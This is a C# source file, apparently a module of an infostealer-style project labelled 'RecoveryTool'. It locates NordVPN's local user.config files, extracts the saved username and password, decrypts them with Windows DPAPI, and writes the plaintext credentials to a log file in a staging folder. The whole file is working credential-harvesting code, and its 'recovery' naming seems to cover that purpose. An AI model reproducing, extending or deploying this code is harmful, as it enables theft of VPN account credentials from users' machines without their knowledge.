using RecoveryTool.Recovery.Utilities;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace RecoveryTool.Recovery.VPNs
{
    class NordVPNService
    {
        public static string NordVPNDir = "\\Vpn\\NordVPN";

        public static async Task SaveNordVPNAsync()
        {
            if (!Directory.Exists(Common.LocalData + "\\NordVPN\\")) return;

            string destDir = Common.EnsureNordVPNPath();
            string accountLogPath = Path.Combine(destDir, "Account.log");

            await using StreamWriter streamWriter = new(accountLogPath);
            DirectoryInfo directoryInfo = new(Path.Combine(Common.LocalData, "NordVPN"));

            if (directoryInfo.Exists)
            {
                foreach (var versionDir in directoryInfo.GetDirectories("NordVpn.exe*"))
                {
                    foreach (var userDir in versionDir.GetDirectories())
                    {
                        await streamWriter.WriteLineAsync($"\tFound version {userDir.Name}");
                        string configPath = Path.Combine(userDir.FullName, "user.config");

                        if (File.Exists(configPath))
                        {
                            var credentials = GetCredentials(configPath);
                            await WriteCredentials(streamWriter, credentials);
                        }
                    }
                }
            }
        }

        private static (string username, string password) GetCredentials(string configPath)
        {
            XmlDocument xmlDocument = new();
            xmlDocument.Load(configPath);
            string username = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
            string password = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
            return (username, password);
        }

        private static async Task WriteCredentials(StreamWriter streamWriter, (string username, string password) credentials)
        {
            if (!string.IsNullOrEmpty(credentials.username))
            {
                await streamWriter.WriteLineAsync($"\t\tUsername: {DecodeNordVpn(credentials.username)}");
            }
            if (!string.IsNullOrEmpty(credentials.password))
            {
                await streamWriter.WriteLineAsync($"\t\tPassword: {DecodeNordVpn(credentials.password)}");
            }
        }

        private static string DecodeNordVpn(string encodedData)
        {
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(encodedData), null, DataProtectionScope.LocalMachine));
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}
